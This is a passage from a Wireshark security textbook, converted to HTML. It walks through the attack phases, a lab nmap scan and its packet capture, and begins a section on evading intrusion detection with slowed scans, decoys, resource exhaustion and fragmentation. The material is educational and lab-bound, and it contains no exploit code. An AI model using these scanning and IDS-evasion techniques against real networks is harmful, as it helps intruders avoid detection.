style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Cover tracks and place</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >backdoors.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:10.3000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This chapter focuses on these attack steps, particularly how Wireshark might be helpful. For every phase of the attack methodology, the attacker would use certain tools to carry out that phase. And if there&#8217;s a way Wireshark can help you, we&#8217;ll cover it. To use Wireshark as a confirmation tool, it is assumed the attacker is able to install, and if necessary, run Wireshark from whatever system he needs.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Unlike how hackers are portrayed in the movies, there is an order of things to do, from start to finish. Any attacker follows this usual order of phases for the best chance of success. And it&#8217;s the same, whether you&#8217;re breaking into a server or breaking into a house.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:8.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Breaking into a house or a building means someone will first scope out the place (reconnaissance), then jiggle the doorknob or test the windows (scanning and enumeration). Once a viable entryway is found, exploit the vulnerability (gaining access). Covering tracks is optional, since maybe the attacker doesn&#8217;t care about hiding his presence. I&#8217;m pretty sure in the case of a house break-in, it&#8217;s more about a fast exit than masking the evidence.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the case of a system break-in, attackers move through these steps, with tools specialized for each phase. Tools like nmap are great for broad scanning and early enumeration, while the exploit phase requires specialized code, customized per vulnerability.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="344"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker305220.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section237" ><p class=MsoNormal  style="margin-top:3.8500pt;margin-right:114.0000pt;margin-left:42.5000pt;text-indent:-21.0000pt;text-align:left;" ><span style="position:absolute;z-index:-1;margin-left:128.7500px;margin-top:119.9167px;width:763.0000px;height:1075.0000px;" ><img width="763"  height="1075"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker305223.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >4. In W4SP files directory, run the lab script </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >python w4sp_webapp.py</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;margin-right:11.1500pt;margin-left:20.0000pt;" ><a name="_bookmark459" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When the Firefox browser comes up, you know the W4SP Lab is ready to work.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:17.2500pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Remember: Do not close the Terminal window you ran the lab script from. If you do, the lab will stop.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After running SETUP to launch the lab environment, you may or may not see the center screen refresh with a full network, showing the devices. If only Kali is shown, click Refresh.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:28.0500pt;margin-left:20.0000pt;" ><a name="_bookmark460" ></a><span><a href="#_bookmark461" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A network layout appears that resembles something like in </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >6-1</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The W4SP Lab is now ready for you.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:20.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark461" ></a><span><a href="#_bookmark460" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-1:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >W4SP Lab network</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section238" ><h2 style="margin-top:3.7000pt;" ><a name="Reconnaissance Using Wireshark" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark462" ></a>Reconnaissance Using Wireshark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark is a network capturing and analysis tool&#8212;what better way to learn about the devices on a network than to sit back and eavesdrop?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Of course, Wireshark doesn&#8217;t just capture traffic&#8212;it can confirm traffic you suspect might be happening. In this case, maybe you suspect someone is conducting reconnaissance on your network or at least probing a particular device. A number of tools are available that would produce that kind of traffic&#8212;ranging from the simple network scanner to commercial-grade vulnerability scanning <a name="_bookmark463" ></a>and analysis tool suites.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Most, if not all, must begin with sending out a probe packet, per interested port, to see if the connection is available.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >One tool that&#8217;s been around for well over a decade is Fyoder&#8217;s nmap. Nmap has been a popular network mapping (</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >nmap</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, get it?) for well over a decade. Able to discover hosts, scan their ports, and detect their operating system with reasonable intelligence, nmap has matured considerably over the years. In<a name="_bookmark464" ></a>&nbsp;</span><span><a href="#_bookmark465" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, we launch a simple nmap scan against the lab machine ftp1 (IP address </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.100.200.144</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) from the Kali machine (IP address </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.100.200.192</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). From the screen output, you can see the scanning engine immediately starts with a ping to the target to detect whether the host is up, then attempts to resolve to an FQDN via DNS. Port scanning by default attempts connections with the most common 1000 ports (out of 65535). Typing </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >nmap -h </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >at a command line will present many options if you want to steer away from the default options. For the scan started in </span><span><a href="#_bookmark465" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, nmap is run with the default options, plus include simple operating system and service version detection (the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-A </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag). Lastly, the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-v </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag tells nmap to be somewhat verbose with its output. Using a double: </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-vv </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag would produce a more verbose output.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section239" ><p class=MsoBodyText  style="margin-left:14.0000pt;" ><img width="762"  height="508"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker307782.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark465" ></a><span><a href="#_bookmark464" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-2:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Nmap port scan</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For the majority of ports probed, you see the TCP connection initiated by the scan, but the ports are closed. For each closed port, the machine</span><span><a href="#_bookmark467" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;responds accordingly, with </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ACK</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RST</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flags set, as shown in </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText ><span><a href="#_bookmark467" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >3</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The stripes illustrate how systematic the probing is, with alternatin</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >g </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SYN </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ACK/RST </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packets. Looking at the timestamps, you&#8217;ll see these packets occurred in less than one thousandth of a second.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section240" ><p class=MsoBodyText ><img width="784"  height="532"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker308325.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:3.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark467" ></a><span><a href="#_bookmark466" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-3:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Nmap port scan in Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:10.0000pt;margin-right:9.0500pt;" ><a name="_bookmark468" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For open ports, the probe packet initiates the three-way handshake, opening a connection. For ports with services running, you might note a banner is grabbed as well. The connection is then closed by the probing machine. Examples of all this are shown in the Wireshark trace in<a name="_bookmark469" ></a>&nbsp;</span><span><a href="#_bookmark470" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section241" ><p class=MsoBodyText ><img width="784"  height="532"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker308723.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:3.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark470" ></a><span><a href="#_bookmark469" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-4:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Open port in Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:10.0000pt;" ><a name="_bookmark471" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are countless examples to be shown here. But this one nmap capture is enough to demonstrate how simple it is, with just this one tool, to witness the packets being sent out.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:16.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Evading IPS/IDS" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark472" ></a>Evading IPS/IDS</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:30.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >An intrusion detection system (IDS) compares traffic against either known signatures or a baseline of </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >normal </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >behavior. The former is signature-based and the latter, anomaly-based. When the IDS sees traffic that&#8217;s notably malicious, it flags it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Consider, for example, the nmap scanning done in the previous section. Clearly, any worthwhile IDS/IPS should immediately detect that traffic. (But is it configured and tuned to alert you?) Nmap allows you to slow the speed with which packets are sent. You might further obfuscate your probing by hiding your IP with nmap decoys. With practice, you could assess first-hand at what point your IDS would</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section242" ><p class=MsoBodyText  style="margin-top:3.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >ignore or continue to detect.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The whole process of monitoring all traffic, comparing it against a database of signatures, or processing it in real time takes resources. And because an IDS is rather resource intensive, it&#8217;s perhaps more prone to a DoS-type of attack, a sort of resource denial attack. Even if an IDS system were packed with ample memory for the job, the vulnerability or limitation would be revealed, should an attacker decide to push the limits.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:7.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are a number of ways to evade the protection an IDS offers. None is guaranteed to work, of course. And a wise attacker will increase the odds of success by first attempting to learn which IDS exists, possibly gain a better understanding of what is being dealt with. But we&#8217;re not going to try to match vendor to technique here. Instead, let&#8217;s explore different ways to evade an IDS, and how Wireshark might serve to confirm for you how you&#8217;re doing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Session Splicing and Fragmentation</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When an attacker establishes a connection and sends malicious traffic, the IDS (you hope) will detect and flag it. How exactly the IDS holds the packet, examines the packet&#8217;s data, and compares that data against known patterns all depends on the IDS design. One difference, for example, is whether or not an IDS holds and stores several packets to examine data spread across multiple packets.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Let&#8217;s say an attacker knew in 